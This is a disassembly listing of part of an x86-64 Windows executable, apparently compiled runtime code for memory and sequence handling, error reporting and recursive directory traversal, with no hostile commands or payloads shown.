  405bca:	4d 85 c0             	test   %r8,%r8
  405bcd:	74 7f                	je     0x405c4e
  405bcf:	4d 85 c9             	test   %r9,%r9
  405bd2:	74 7a                	je     0x405c4e
  405bd4:	48 8d 74 24 38       	lea    0x38(%rsp),%rsi
  405bd9:	ba 18 00 00 00       	mov    $0x18,%edx
  405bde:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  405be3:	48 89 f1             	mov    %rsi,%rcx
  405be6:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
  405beb:	e8 5c e5 ff ff       	call   0x40414c
  405bf0:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
  405bf5:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
  405bfa:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
  405c01:	00 
  405c02:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
  405c06:	48 8b 15 e3 1a 01 00 	mov    0x11ae3(%rip),%rdx        # 0x4176f0
  405c0d:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
  405c12:	4c 89 4c 24 48       	mov    %r9,0x48(%rsp)
  405c17:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  405c1c:	e8 04 02 00 00       	call   0x405e25
  405c21:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
  405c25:	48 89 c2             	mov    %rax,%rdx
  405c28:	e8 2f e5 ff ff       	call   0x40415c
  405c2d:	48 8b 53 20          	mov    0x20(%rbx),%rdx
  405c31:	48 8b 02             	mov    (%rdx),%rax
  405c34:	48 8d 48 01          	lea    0x1(%rax),%rcx
  405c38:	48 6b c0 18          	imul   $0x18,%rax,%rax
  405c3c:	48 89 0a             	mov    %rcx,(%rdx)
  405c3f:	b9 06 00 00 00       	mov    $0x6,%ecx
  405c44:	48 8d 44 02 10       	lea    0x10(%rdx,%rax,1),%rax
  405c49:	48 89 c7             	mov    %rax,%rdi
  405c4c:	f3 a5                	rep movsl (%rsi),(%rdi)
  405c4e:	48 89 d9             	mov    %rbx,%rcx
  405c51:	e8 e7 fe ff ff       	call   0x405b3d
  405c56:	90                   	nop
  405c57:	48 83 c4 50          	add    $0x50,%rsp
  405c5b:	5b                   	pop    %rbx
  405c5c:	5e                   	pop    %rsi
  405c5d:	5f                   	pop    %rdi
  405c5e:	c3                   	ret
  405c5f:	56                   	push   %rsi
  405c60:	53                   	push   %rbx
  405c61:	48 83 ec 38          	sub    $0x38,%rsp
  405c65:	e8 ad ce ff ff       	call   0x402b17
  405c6a:	48 8b 48 28          	mov    0x28(%rax),%rcx
  405c6e:	48 85 c9             	test   %rcx,%rcx
  405c71:	75 71                	jne    0x405ce4
  405c73:	48 8b 0d 76 19 01 00 	mov    0x11976(%rip),%rcx        # 0x4175f0
  405c7a:	ba 30 00 00 00       	mov    $0x30,%edx
  405c7f:	e8 be f5 ff ff       	call   0x405242
  405c84:	48 8d 0d 55 ed 00 00 	lea    0xed55(%rip),%rcx        # 0x4149e0
  405c8b:	48 89 c3             	mov    %rax,%rbx
  405c8e:	48 8b 05 0b 1a 01 00 	mov    0x11a0b(%rip),%rax        # 0x4176a0
  405c95:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  405c99:	48 89 03             	mov    %rax,(%rbx)
  405c9c:	48 8d 05 80 eb 00 00 	lea    0xeb80(%rip),%rax        # 0x414823
  405ca3:	48 89 43 10          	mov    %rax,0x10(%rbx)
  405ca7:	e8 ee f4 ff ff       	call   0x40519a
  405cac:	48 85 f6             	test   %rsi,%rsi
  405caf:	48 89 43 18          	mov    %rax,0x18(%rbx)
  405cb3:	74 08                	je     0x405cbd
  405cb5:	48 89 f1             	mov    %rsi,%rcx
  405cb8:	e8 43 80 00 00       	call   0x40dd00
  405cbd:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  405cc4:	00 00 
  405cc6:	4c 8d 0d 63 eb 00 00 	lea    0xeb63(%rip),%r9        # 0x414830
  405ccd:	48 89 d9             	mov    %rbx,%rcx
  405cd0:	4c 8d 05 63 eb 00 00 	lea    0xeb63(%rip),%r8        # 0x41483a
  405cd7:	48 8d 15 45 eb 00 00 	lea    0xeb45(%rip),%rdx        # 0x414823
  405cde:	e8 d2 fe ff ff       	call   0x405bb5
  405ce3:	90                   	nop
  405ce4:	48 83 c4 38          	add    $0x38,%rsp
  405ce8:	5b                   	pop    %rbx
  405ce9:	5e                   	pop    %rsi
  405cea:	e9 4e fe ff ff       	jmp    0x405b3d
  405cef:	53                   	push   %rbx
  405cf0:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
  405cf7:	c6 44 24 2f 01       	movb   $0x1,0x2f(%rsp)
  405cfc:	8a 44 24 2f          	mov    0x2f(%rsp),%al
  405d00:	48 89 cb             	mov    %rcx,%rbx
  405d03:	84 c0                	test   %al,%al
  405d05:	74 13                	je     0x405d1a
  405d07:	ff 15 2f 57 03 00    	call   *0x3572f(%rip)        # 0x43b43c
  405d0d:	48 89 da             	mov    %rbx,%rdx
  405d10:	48 8d 48 60          	lea    0x60(%rax),%rcx
  405d14:	e8 f9 ba ff ff       	call   0x401812
  405d19:	90                   	nop
  405d1a:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
  405d21:	5b                   	pop    %rbx
  405d22:	c3                   	ret
  405d23:	48 83 ec 28          	sub    $0x28,%rsp
  405d27:	48 8d 05 15 eb 00 00 	lea    0xeb15(%rip),%rax        # 0x414843
  405d2e:	83 f9 02             	cmp    $0x2,%ecx
  405d31:	74 39                	je     0x405d6c
  405d33:	48 8d 05 29 eb 00 00 	lea    0xeb29(%rip),%rax        # 0x414863
  405d3a:	83 f9 0b             	cmp    $0xb,%ecx
  405d3d:	74 2d                	je     0x405d6c
  405d3f:	48 8d 05 5b eb 00 00 	lea    0xeb5b(%rip),%rax        # 0x4148a1
  405d46:	83 f9 16             	cmp    $0x16,%ecx
  405d49:	74 21                	je     0x405d6c
  405d4b:	48 8d 05 6f eb 00 00 	lea    0xeb6f(%rip),%rax        # 0x4148c1
  405d52:	83 f9 08             	cmp    $0x8,%ecx
  405d55:	74 15                	je     0x405d6c
  405d57:	48 8d 05 7e eb 00 00 	lea    0xeb7e(%rip),%rax        # 0x4148dc
  405d5e:	83 f9 04             	cmp    $0x4,%ecx
  405d61:	48 8d 0d 90 eb 00 00 	lea    0xeb90(%rip),%rcx        # 0x4148f8
  405d68:	48 0f 45 c1          	cmovne %rcx,%rax
  405d6c:	48 89 c1             	mov    %rax,%rcx
  405d6f:	e8 7b ff ff ff       	call   0x405cef
  405d74:	b9 01 00 00 00       	mov    $0x1,%ecx
  405d79:	e8 8a 58 00 00       	call   0x40b608
  405d7e:	90                   	nop
  405d7f:	56                   	push   %rsi
  405d80:	53                   	push   %rbx
  405d81:	48 83 ec 38          	sub    $0x38,%rsp
  405d85:	48 8b 0d e4 18 01 00 	mov    0x118e4(%rip),%rcx        # 0x417670
  405d8c:	ba 30 00 00 00       	mov    $0x30,%edx
  405d91:	e8 ac f4 ff ff       	call   0x405242
  405d96:	48 8d 0d 83 eb 00 00 	lea    0xeb83(%rip),%rcx        # 0x414920
  405d9d:	48 89 c3             	mov    %rax,%rbx
  405da0:	48 8b 05 e9 18 01 00 	mov    0x118e9(%rip),%rax        # 0x417690
  405da7:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  405dab:	48 89 03             	mov    %rax,(%rbx)
  405dae:	48 8d 05 53 eb 00 00 	lea    0xeb53(%rip),%rax        # 0x414908
  405db5:	48 89 43 10          	mov    %rax,0x10(%rbx)
  405db9:	e8 dc f3 ff ff       	call   0x40519a
  405dbe:	48 85 f6             	test   %rsi,%rsi
  405dc1:	48 89 43 18          	mov    %rax,0x18(%rbx)
  405dc5:	74 08                	je     0x405dcf
  405dc7:	48 89 f1             	mov    %rsi,%rcx
  405dca:	e8 31 7f 00 00       	call   0x40dd00
  405dcf:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  405dd6:	00 00 
  405dd8:	4c 8d 0d 51 ea 00 00 	lea    0xea51(%rip),%r9        # 0x414830
  405ddf:	48 89 d9             	mov    %rbx,%rcx
  405de2:	4c 8d 05 51 ea 00 00 	lea    0xea51(%rip),%r8        # 0x41483a
  405de9:	48 8d 15 18 eb 00 00 	lea    0xeb18(%rip),%rdx        # 0x414908
  405df0:	e8 c0 fd ff ff       	call   0x405bb5
  405df5:	90                   	nop
  405df6:	53                   	push   %rbx
  405df7:	48 83 ec 20          	sub    $0x20,%rsp
  405dfb:	48 8b 41 10          	mov    0x10(%rcx),%rax
  405dff:	48 89 d3             	mov    %rdx,%rbx
  405e02:	48 0f af 10          	imul   (%rax),%rdx
  405e06:	70 06                	jo     0x405e0e
  405e08:	48 83 c2 10          	add    $0x10,%rdx
  405e0c:	71 05                	jno    0x405e13
  405e0e:	e8 6c ff ff ff       	call   0x405d7f
  405e13:	e8 2a f4 ff ff       	call   0x405242
  405e18:	48 89 18             	mov    %rbx,(%rax)
  405e1b:	48 89 58 08          	mov    %rbx,0x8(%rax)
  405e1f:	48 83 c4 20          	add    $0x20,%rsp
  405e23:	5b                   	pop    %rbx
  405e24:	c3                   	ret
  405e25:	57                   	push   %rdi
  405e26:	56                   	push   %rsi
  405e27:	53                   	push   %rbx
  405e28:	48 83 ec 20          	sub    $0x20,%rsp
  405e2c:	48 85 c9             	test   %rcx,%rcx
  405e2f:	48 89 cb             	mov    %rcx,%rbx
  405e32:	48 89 d6             	mov    %rdx,%rsi
  405e35:	75 16                	jne    0x405e4d
  405e37:	ba 01 00 00 00       	mov    $0x1,%edx
  405e3c:	48 89 f1             	mov    %rsi,%rcx
  405e3f:	e8 b2 ff ff ff       	call   0x405df6
  405e44:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  405e4b:	eb 48                	jmp    0x405e95
  405e4d:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  405e54:	ff ff 3f 
  405e57:	48 23 4b 08          	and    0x8(%rbx),%rcx
  405e5b:	48 3b 0b             	cmp    (%rbx),%rcx
  405e5e:	7f 38                	jg     0x405e98
  405e60:	e8 0d f2 ff ff       	call   0x405072
  405e65:	48 89 f1             	mov    %rsi,%rcx
  405e68:	48 89 c2             	mov    %rax,%rdx
  405e6b:	e8 86 ff ff ff       	call   0x405df6
  405e70:	48 8b 13             	mov    (%rbx),%rdx
  405e73:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  405e77:	48 8d 73 10          	lea    0x10(%rbx),%rsi
  405e7b:	48 89 10             	mov    %rdx,(%rax)
  405e7e:	48 8d 50 10          	lea    0x10(%rax),%rdx
  405e82:	48 8b 09             	mov    (%rcx),%rcx
  405e85:	48 89 d7             	mov    %rdx,%rdi
  405e88:	48 0f af 0b          	imul   (%rbx),%rcx
  405e8c:	f3 a4                	rep movsb (%rsi),(%rdi)
  405e8e:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  405e95:	48 89 c3             	mov    %rax,%rbx
  405e98:	48 89 d8             	mov    %rbx,%rax
  405e9b:	48 83 c4 20          	add    $0x20,%rsp
  405e9f:	5b                   	pop    %rbx
  405ea0:	5e                   	pop    %rsi
  405ea1:	5f                   	pop    %rdi
  405ea2:	c3                   	ret
  405ea3:	90                   	nop
  405ea4:	90                   	nop
  405ea5:	90                   	nop
  405ea6:	90                   	nop
  405ea7:	90                   	nop
  405ea8:	90                   	nop
  405ea9:	90                   	nop
  405eaa:	90                   	nop
  405eab:	90                   	nop
  405eac:	90                   	nop
  405ead:	90                   	nop
  405eae:	90                   	nop
  405eaf:	90                   	nop
  405eb0:	c3                   	ret
  405eb1:	57                   	push   %rdi
  405eb2:	56                   	push   %rsi
  405eb3:	53                   	push   %rbx
  405eb4:	48 83 ec 20          	sub    $0x20,%rsp
  405eb8:	31 ff                	xor    %edi,%edi
  405eba:	48 85 c9             	test   %rcx,%rcx
  405ebd:	48 89 cb             	mov    %rcx,%rbx
  405ec0:	74 03                	je     0x405ec5
  405ec2:	48 8b 39             	mov    (%rcx),%rdi
  405ec5:	48 89 f8             	mov    %rdi,%rax
  405ec8:	48 89 fe             	mov    %rdi,%rsi
  405ecb:	83 e0 03             	and    $0x3,%eax
  405ece:	48 c1 fe 02          	sar    $0x2,%rsi
  405ed2:	48 83 f8 01          	cmp    $0x1,%rax
  405ed6:	48 83 de ff          	sbb    $0xffffffffffffffff,%rsi
  405eda:	84 d2                	test   %dl,%dl
  405edc:	74 16                	je     0x405ef4
  405ede:	48 8b 0d cb 16 01 00 	mov    0x116cb(%rip),%rcx        # 0x4175b0
  405ee5:	48 8d 56 01          	lea    0x1(%rsi),%rdx
  405ee9:	e8 08 ff ff ff       	call   0x405df6
  405eee:	89 7c b0 10          	mov    %edi,0x10(%rax,%rsi,4)
  405ef2:	eb 0f                	jmp    0x405f03
  405ef4:	48 8b 0d b5 16 01 00 	mov    0x116b5(%rip),%rcx        # 0x4175b0
  405efb:	48 89 f2             	mov    %rsi,%rdx
  405efe:	e8 f3 fe ff ff       	call   0x405df6
  405f03:	48 85 db             	test   %rbx,%rbx
  405f06:	74 2e                	je     0x405f36
  405f08:	4c 8b 13             	mov    (%rbx),%r10
  405f0b:	31 d2                	xor    %edx,%edx
  405f0d:	4c 39 d2             	cmp    %r10,%rdx
  405f10:	7d 24                	jge    0x405f36
  405f12:	44 0f b6 44 13 10    	movzbl 0x10(%rbx,%rdx,1),%r8d
  405f18:	8d 0c d5 00 00 00 00 	lea    0x0(,%rdx,8),%ecx
  405f1f:	49 89 d1             	mov    %rdx,%r9
  405f22:	48 ff c2             	inc    %rdx
  405f25:	49 83 e1 fc          	and    $0xfffffffffffffffc,%r9
  405f29:	83 e1 18             	and    $0x18,%ecx
  405f2c:	49 d3 e0             	shl    %cl,%r8
  405f2f:	46 09 44 08 10       	or     %r8d,0x10(%rax,%r9,1)
  405f34:	eb d7                	jmp    0x405f0d
  405f36:	48 83 c4 20          	add    $0x20,%rsp
  405f3a:	5b                   	pop    %rbx
  405f3b:	5e                   	pop    %rsi
  405f3c:	5f                   	pop    %rdi
  405f3d:	c3                   	ret
  405f3e:	56                   	push   %rsi
  405f3f:	53                   	push   %rbx
  405f40:	48 83 ec 28          	sub    $0x28,%rsp
  405f44:	31 c0                	xor    %eax,%eax
  405f46:	48 85 c9             	test   %rcx,%rcx
  405f49:	48 89 ce             	mov    %rcx,%rsi
  405f4c:	74 03                	je     0x405f51
  405f4e:	48 8b 01             	mov    (%rcx),%rax
  405f51:	48 8d 1c 85 00 00 00 	lea    0x0(,%rax,4),%rbx
  405f58:	00 
  405f59:	84 d2                	test   %dl,%dl
  405f5b:	74 1b                	je     0x405f78
  405f5d:	8b 54 86 0c          	mov    0xc(%rsi,%rax,4),%edx
  405f61:	48 8d 4b f9          	lea    -0x7(%rbx),%rcx
  405f65:	31 c0                	xor    %eax,%eax
  405f67:	48 39 ca             	cmp    %rcx,%rdx
  405f6a:	7c 3e                	jl     0x405faa
  405f6c:	48 83 eb 04          	sub    $0x4,%rbx
  405f70:	48 39 da             	cmp    %rbx,%rdx
  405f73:	7f 35                	jg     0x405faa
  405f75:	48 89 d3             	mov    %rdx,%rbx
  405f78:	48 89 d9             	mov    %rbx,%rcx
  405f7b:	e8 33 f3 ff ff       	call   0x4052b3
  405f80:	31 d2                	xor    %edx,%edx
  405f82:	48 39 d3             	cmp    %rdx,%rbx
  405f85:	7e 23                	jle    0x405faa
  405f87:	8d 0c d5 00 00 00 00 	lea    0x0(,%rdx,8),%ecx
  405f8e:	49 89 d0             	mov    %rdx,%r8
  405f91:	49 c1 f8 02          	sar    $0x2,%r8
  405f95:	83 e1 18             	and    $0x18,%ecx
  405f98:	46 8b 44 86 10       	mov    0x10(%rsi,%r8,4),%r8d
  405f9d:	41 d3 e8             	shr    %cl,%r8d
  405fa0:	44 88 44 10 10       	mov    %r8b,0x10(%rax,%rdx,1)
  405fa5:	48 ff c2             	inc    %rdx
  405fa8:	eb d8                	jmp    0x405f82
  405faa:	48 83 c4 28          	add    $0x28,%rsp
  405fae:	5b                   	pop    %rbx
  405faf:	5e                   	pop    %rsi
  405fb0:	c3                   	ret
  405fb1:	48 83 ec 28          	sub    $0x28,%rsp
  405fb5:	e8 5d cb ff ff       	call   0x402b17
  405fba:	48 8b 50 20          	mov    0x20(%rax),%rdx
  405fbe:	48 8b 12             	mov    (%rdx),%rdx
  405fc1:	48 89 50 20          	mov    %rdx,0x20(%rax)
  405fc5:	48 83 c4 28          	add    $0x28,%rsp
  405fc9:	c3                   	ret
  405fca:	48 83 ec 28          	sub    $0x28,%rsp
  405fce:	45 31 c0             	xor    %r8d,%r8d
  405fd1:	48 85 c9             	test   %rcx,%rcx
  405fd4:	74 03                	je     0x405fd9
  405fd6:	4c 8b 01             	mov    (%rcx),%r8
  405fd9:	45 31 c9             	xor    %r9d,%r9d
  405fdc:	48 85 d2             	test   %rdx,%rdx
  405fdf:	74 03                	je     0x405fe4
  405fe1:	4c 8b 0a             	mov    (%rdx),%r9
  405fe4:	31 c0                	xor    %eax,%eax
  405fe6:	4d 39 c8             	cmp    %r9,%r8
  405fe9:	75 19                	jne    0x406004
  405feb:	4d 85 c0             	test   %r8,%r8
  405fee:	b0 01                	mov    $0x1,%al
  405ff0:	74 12                	je     0x406004
  405ff2:	48 83 c2 10          	add    $0x10,%rdx
  405ff6:	48 83 c1 10          	add    $0x10,%rcx
  405ffa:	e8 09 58 00 00       	call   0x40b808
  405fff:	85 c0                	test   %eax,%eax
  406001:	0f 94 c0             	sete   %al
  406004:	48 83 c4 28          	add    $0x28,%rsp
  406008:	c3                   	ret
  406009:	53                   	push   %rbx
  40600a:	48 83 ec 20          	sub    $0x20,%rsp
  40600e:	48 89 cb             	mov    %rcx,%rbx
  406011:	e8 01 cb ff ff       	call   0x402b17
  406016:	48 8b 50 20          	mov    0x20(%rax),%rdx
  40601a:	48 89 13             	mov    %rdx,(%rbx)
  40601d:	48 89 58 20          	mov    %rbx,0x20(%rax)
  406021:	48 83 c4 20          	add    $0x20,%rsp
  406025:	5b                   	pop    %rbx
  406026:	c3                   	ret
  406027:	57                   	push   %rdi
  406028:	56                   	push   %rsi
  406029:	48 85 d2             	test   %rdx,%rdx
  40602c:	48 89 c8             	mov    %rcx,%rax
  40602f:	74 1e                	je     0x40604f
  406031:	48 8b 09             	mov    (%rcx),%rcx
  406034:	48 8d 72 10          	lea    0x10(%rdx),%rsi
  406038:	48 8b 3a             	mov    (%rdx),%rdi
  40603b:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
  406040:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
  406044:	4c 89 c7             	mov    %r8,%rdi
  406047:	f3 a4                	rep movsb (%rsi),(%rdi)
  406049:	48 8b 12             	mov    (%rdx),%rdx
  40604c:	48 01 10             	add    %rdx,(%rax)
  40604f:	5e                   	pop    %rsi
  406050:	5f                   	pop    %rdi
  406051:	c3                   	ret
  406052:	55                   	push   %rbp
  406053:	41 57                	push   %r15
  406055:	41 56                	push   %r14
  406057:	41 55                	push   %r13
  406059:	41 54                	push   %r12
  40605b:	57                   	push   %rdi
  40605c:	56                   	push   %rsi
  40605d:	53                   	push   %rbx
  40605e:	48 89 e5             	mov    %rsp,%rbp
  406061:	48 81 ec 78 04 00 00 	sub    $0x478,%rsp
  406068:	48 89 4d 48          	mov    %rcx,0x48(%rbp)
  40606c:	48 8d 0d 4d 07 01 00 	lea    0x1074d(%rip),%rcx        # 0x4167c0
  406073:	48 89 55 50          	mov    %rdx,0x50(%rbp)
  406077:	e8 ec 14 00 00       	call   0x407568
  40607c:	48 8d 15 1d 07 01 00 	lea    0x1071d(%rip),%rdx        # 0x4167a0
  406083:	48 89 c1             	mov    %rax,%rcx
  406086:	e8 b4 1d 00 00       	call   0x407e3f
  40608b:	4c 8b 05 3e 16 01 00 	mov    0x1163e(%rip),%r8        # 0x4176d0
  406092:	48 8d 8d 50 fc ff ff 	lea    -0x3b0(%rbp),%rcx
  406099:	48 8d 15 50 fc 00 00 	lea    0xfc50(%rip),%rdx        # 0x415cf0
  4060a0:	48 89 85 38 fc ff ff 	mov    %rax,-0x3c8(%rbp)
  4060a7:	e8 17 2e 00 00       	call   0x408ec3
  4060ac:	48 8d 85 a8 fd ff ff 	lea    -0x258(%rbp),%rax
  4060b3:	48 89 85 40 fc ff ff 	mov    %rax,-0x3c0(%rbp)
  4060ba:	48 83 c0 2c          	add    $0x2c,%rax
  4060be:	48 89 85 d8 fb ff ff 	mov    %rax,-0x428(%rbp)
  4060c5:	48 8b 85 50 fc ff ff 	mov    -0x3b0(%rbp),%rax
  4060cc:	48 85 c0             	test   %rax,%rax
  4060cf:	0f 84 d4 08 00 00    	je     0x4069a9
  4060d5:	48 8b 10             	mov    (%rax),%rdx
  4060d8:	48 85 d2             	test   %rdx,%rdx
  4060db:	0f 8e c8 08 00 00    	jle    0x4069a9
  4060e1:	48 8b 4c d0 08       	mov    0x8(%rax,%rdx,8),%rcx
  4060e6:	4c 8d 62 ff          	lea    -0x1(%rdx),%r12
  4060ea:	e8 ee 2a 00 00       	call   0x408bdd
  4060ef:	48 8b 9d 50 fc ff ff 	mov    -0x3b0(%rbp),%rbx
  4060f6:	48 89 85 00 fc ff ff 	mov    %rax,-0x400(%rbp)
  4060fd:	48 85 db             	test   %rbx,%rbx
  406100:	49 89 dd             	mov    %rbx,%r13
  406103:	75 17                	jne    0x40611c
  406105:	48 8b 0d c4 15 01 00 	mov    0x115c4(%rip),%rcx        # 0x4176d0
  40610c:	4c 89 e2             	mov    %r12,%rdx
  40610f:	e8 e2 fc ff ff       	call   0x405df6
  406114:	48 89 c3             	mov    %rax,%rbx
  406117:	e9 ce 00 00 00       	jmp    0x4061ea
  40611c:	48 8b 3d ad 15 01 00 	mov    0x115ad(%rip),%rdi        # 0x4176d0
  406123:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  40612a:	ff ff 3f 
  40612d:	48 23 4b 08          	and    0x8(%rbx),%rcx
  406131:	48 8b 57 10          	mov    0x10(%rdi),%rdx
  406135:	49 39 cc             	cmp    %rcx,%r12
  406138:	48 8b 32             	mov    (%rdx),%rsi
  40613b:	7e 37                	jle    0x406174
  40613d:	e8 30 ef ff ff       	call   0x405072
  406142:	48 89 f9             	mov    %rdi,%rcx
  406145:	49 39 c4             	cmp    %rax,%r12
  406148:	49 0f 4d c4          	cmovge %r12,%rax
  40614c:	48 89 c2             	mov    %rax,%rdx
  40614f:	e8 a2 fc ff ff       	call   0x405df6
  406154:	48 0f af 33          	imul   (%rbx),%rsi
  406158:	48 8d 50 10          	lea    0x10(%rax),%rdx
  40615c:	48 89 d7             	mov    %rdx,%rdi
  40615f:	48 89 f1             	mov    %rsi,%rcx
  406162:	48 8d 73 10          	lea    0x10(%rbx),%rsi
  406166:	f3 a4                	rep movsb (%rsi),(%rdi)
  406168:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  40616f:	48 89 c3             	mov    %rax,%rbx
  406172:	eb 73                	jmp    0x4061e7
  406174:	4c 8b 3b             	mov    (%rbx),%r15
  406177:	4d 39 fc             	cmp    %r15,%r12
  40617a:	7d 6b                	jge    0x4061e7
  40617c:	f6 42 09 01          	testb  $0x1,0x9(%rdx)
  406180:	75 4c                	jne    0x4061ce
  406182:	4c 89 e2             	mov    %r12,%rdx
  406185:	48 89 b5 f8 fb ff ff 	mov    %rsi,-0x408(%rbp)
  40618c:	49 89 da             	mov    %rbx,%r10
  40618f:	4c 89 e7             	mov    %r12,%rdi
  406192:	48 0f af d6          	imul   %rsi,%rdx
  406196:	4c 8d 74 13 10       	lea    0x10(%rbx,%rdx,1),%r14
  40619b:	49 8b 52 f8          	mov    -0x8(%r10),%rdx
  40619f:	4c 89 f1             	mov    %r14,%rcx
  4061a2:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  4061a8:	48 ff c7             	inc    %rdi
  4061ab:	4c 89 95 d0 fb ff ff 	mov    %r10,-0x430(%rbp)
  4061b2:	48 8b 52 10          	mov    0x10(%rdx),%rdx
  4061b6:	e8 61 dd ff ff       	call   0x403f1c
  4061bb:	4c 03 b5 f8 fb ff ff 	add    -0x408(%rbp),%r14
  4061c2:	49 39 ff             	cmp    %rdi,%r15
  4061c5:	4c 8b 95 d0 fb ff ff 	mov    -0x430(%rbp),%r10
  4061cc:	75 cd                	jne    0x40619b
  4061ce:	49 8b 55 00          	mov    0x0(%r13),%rdx
  4061d2:	4c 29 e2             	sub    %r12,%rdx
  4061d5:	48 0f af d6          	imul   %rsi,%rdx
  4061d9:	49 0f af f4          	imul   %r12,%rsi
  4061dd:	48 8d 4c 33 10       	lea    0x10(%rbx,%rsi,1),%rcx
  4061e2:	e8 65 df ff ff       	call   0x40414c
  4061e7:	4c 89 23             	mov    %r12,(%rbx)
  4061ea:	48 8d 8d 50 fc ff ff 	lea    -0x3b0(%rbp),%rcx
  4061f1:	48 89 da             	mov    %rbx,%rdx
  4061f4:	e8 80 f1 ff ff       	call   0x405379
  4061f9:	48 8b 85 00 fc ff ff 	mov    -0x400(%rbp),%rax
  406200:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
  406204:	48 89 c2             	mov    %rax,%rdx
  406207:	48 89 85 28 fc ff ff 	mov    %rax,-0x3d8(%rbp)
  40620e:	e8 2c 1c 00 00       	call   0x407e3f
  406213:	48 8b 8d 40 fc ff ff 	mov    -0x3c0(%rbp),%rcx
  40621a:	ba 50 02 00 00       	mov    $0x250,%edx
  40621f:	48 89 c3             	mov    %rax,%rbx
  406222:	e8 25 df ff ff       	call   0x40414c
  406227:	48 8d 15 42 05 01 00 	lea    0x10542(%rip),%rdx        # 0x416770
  40622e:	48 89 d9             	mov    %rbx,%rcx
  406231:	e8 09 1c 00 00       	call   0x407e3f
  406236:	48 8b 95 40 fc ff ff 	mov    -0x3c0(%rbp),%rdx
  40623d:	48 89 c1             	mov    %rax,%rcx
  406240:	e8 6e c9 ff ff       	call   0x402bb3
  406245:	48 89 85 30 fc ff ff 	mov    %rax,-0x3d0(%rbp)
  40624c:	48 ff c0             	inc    %rax
  40624f:	0f 84 70 fe ff ff    	je     0x4060c5
  406255:	48 8d 9d 98 fc ff ff 	lea    -0x368(%rbp),%rbx
  40625c:	48 89 d9             	mov    %rbx,%rcx
  40625f:	e8 a5 fd ff ff       	call   0x406009
  406264:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  406268:	48 89 ea             	mov    %rbp,%rdx
  40626b:	e8 d8 53 00 00       	call   0x40b648
  406270:	48 98                	cltq
  406272:	48 85 c0             	test   %rax,%rax
  406275:	48 89 85 a0 fc ff ff 	mov    %rax,-0x360(%rbp)
  40627c:	0f 85 fe 06 00 00    	jne    0x406980
  406282:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%rbp)
  406289:	2e 
  40628a:	75 24                	jne    0x4062b0
  40628c:	66 8b 85 d6 fd ff ff 	mov    -0x22a(%rbp),%ax
  406293:	66 85 c0             	test   %ax,%ax
  406296:	0f 84 a9 06 00 00    	je     0x406945
  40629c:	66 83 f8 2e          	cmp    $0x2e,%ax
  4062a0:	75 0e                	jne    0x4062b0
  4062a2:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%rbp)
  4062a9:	00 
  4062aa:	0f 84 95 06 00 00    	je     0x406945
  4062b0:	8b 85 a8 fd ff ff    	mov    -0x258(%rbp),%eax
  4062b6:	48 8b 8d d8 fb ff ff 	mov    -0x428(%rbp),%rcx
  4062bd:	a8 10                	test   $0x10,%al
  4062bf:	0f 95 c3             	setne  %bl
  4062c2:	25 00 04 00 00       	and    $0x400,%eax
  4062c7:	01 db                	add    %ebx,%ebx
  4062c9:	83 f8 01             	cmp    $0x1,%eax
  4062cc:	80 db ff             	sbb    $0xff,%bl
  4062cf:	e8 66 c1 ff ff       	call   0x40243a
  4062d4:	48 89 c1             	mov    %rax,%rcx
  4062d7:	e8 4e c9 ff ff       	call   0x402c2a
  4062dc:	48 8b 8d 28 fc ff ff 	mov    -0x3d8(%rbp),%rcx
  4062e3:	48 89 c2             	mov    %rax,%rdx
  4062e6:	e8 54 1b 00 00       	call   0x407e3f
  4062eb:	48 89 c6             	mov    %rax,%rsi
  4062ee:	b8 0c 00 00 00       	mov    $0xc,%eax
  4062f3:	0f a3 d8             	bt     %ebx,%eax
  4062f6:	72 0a                	jb     0x406302
  4062f8:	84 db                	test   %bl,%bl
  4062fa:	0f 85 45 06 00 00    	jne    0x406945
  406300:	eb 4e                	jmp    0x406350
  406302:	80 fb 02             	cmp    $0x2,%bl
  406305:	75 f1                	jne    0x4062f8
  406307:	48 8b 15 c2 13 01 00 	mov    0x113c2(%rip),%rdx        # 0x4176d0
  40630e:	48 8b 8d 50 fc ff ff 	mov    -0x3b0(%rbp),%rcx
  406315:	e8 0b fb ff ff       	call   0x405e25
  40631a:	48 8b 10             	mov    (%rax),%rdx
  40631d:	48 89 85 50 fc ff ff 	mov    %rax,-0x3b0(%rbp)
  406324:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
  406328:	4c 8d 24 d0          	lea    (%rax,%rdx,8),%r12
  40632c:	48 89 08             	mov    %rcx,(%rax)
  40632f:	48 89 f1             	mov    %rsi,%rcx
  406332:	49 8b 7c 24 10       	mov    0x10(%r12),%rdi
  406337:	e8 5e ee ff ff       	call   0x40519a
  40633c:	49 89 44 24 10       	mov    %rax,0x10(%r12)
  406341:	48 85 ff             	test   %rdi,%rdi
  406344:	74 b2                	je     0x4062f8
  406346:	48 89 f9             	mov    %rdi,%rcx
  406349:	e8 b2 79 00 00       	call   0x40dd00
  40634e:	eb a8                	jmp    0x4062f8
